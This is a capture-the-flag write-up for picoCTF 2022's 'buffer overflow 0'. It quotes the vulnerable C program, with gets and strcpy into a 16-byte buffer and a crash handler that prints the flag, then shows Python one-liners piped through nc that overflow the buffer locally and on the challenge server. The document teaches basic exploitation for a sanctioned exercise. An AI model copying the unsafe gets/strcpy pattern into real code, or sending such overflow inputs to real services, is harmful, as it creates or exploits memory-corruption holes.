# buffer overflow 0

- [Challenge information](buffer_overflow_0.md#challenge-information)
- [Solution](buffer_overflow_0.md#solution)

## Challenge information
```
Points: 100
Tags: picoCTF 2022, Binary Expoitation, gets
Author: ALEX FULTON / PALASH OSWAL

Description:

Smash the stack
Let's start off simple, can you overflow the correct buffer? 

The program is available here. You can view source here. And connect with it using:
nc saturn.picoctf.net 61481
 
Hints:
1. How can you trigger the flag to print?
2. If you try to do the math by hand, maybe try and add a few more characters. 
   Sometimes there are things you aren't expecting.
3. Run man gets and read the BUGS section. How many characters can the program really read?
```

## Solution

### Study the source code

The `main` function of the program look like this
```c
int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

This is a classic buffer overflow. The program sets up a signal handler catching `SIGSEGV` error conditions.
SigSegV means a signal for memory access violation, essentially trying to read or write from/to a memory area 
that your process does not have access to. This is also known as a segmentation fault.

When this happens the code in the `sigsegv_handler` is executed and tries to fix the problem or at least graciously quit the program.
```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```

Conveniently, in this case the code prints the flag for us.

There is also a `vuln` function with a rather small buffer
```c
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```

If we overflow this buffer with more data than it can handle, we might write to the return address of the function stored on the stack. If that memory address is illegal when the program tries to return, we will cause a segmentation fault.

### Try exploitation locally 

Lets try to overflow the buffer locally first.
```
┌──(kali㉿kali)-[/picoCTF/picoCTF_2022/Binary_Exploitation/Buffer_Overflow_0]
└─$ chmod +x vuln

┌──(kali㉿kali)-[/picoCTF/picoCTF_2022/Binary_Exploitation/Buffer_Overflow_0]
└─$ ./vuln
Please create 'flag.txt' in this directory with your own debugging flag.
```

Ah, that's right. We need a dummy flag for testing.
```
┌──(kali㉿kali)-[/picoCTF/picoCTF_2022/Binary_Exploitation/Buffer_Overflow_0]
└─$ echo "picoCTF{Fake_Flag}" > flag.txt
                                          
┌──(kali㉿kali)-[/picoCTF/picoCTF_2022/Binary_Exploitation/Buffer_Overflow_0]
└─$ python -c "print('A'*20)" | ./vuln  
Input: picoCTF{Fake_Flag}
```

Success! We sent 20 bytes (slightly more than the buffer size of 16) and we got the flag.

### Connect to the server and get the flag

Finally, lets connect to the server and try to get the flag. If we don't succeed, we slight increse the input until we do.
```
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2022/Binary_Exploitation/Buffer_Overflow_0]
└─$ python -c "print('A'*20)" | nc saturn.picoctf.net 61481

Input:                             
┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2022/Binary_Exploitation/Buffer_Overflow_0]
└─$ python -c "print('A'*25)" | nc saturn.picoctf.net 61481
Input:

┌──(kali㉿kali)-[/mnt/…/picoCTF/picoCTF_2022/Binary_Exploitation/Buffer_Overflow_0]
└─$ python -c "print('A'*30)" | nc saturn.picoctf.net 61481
Input: picoCTF{<REDACTED>}
```
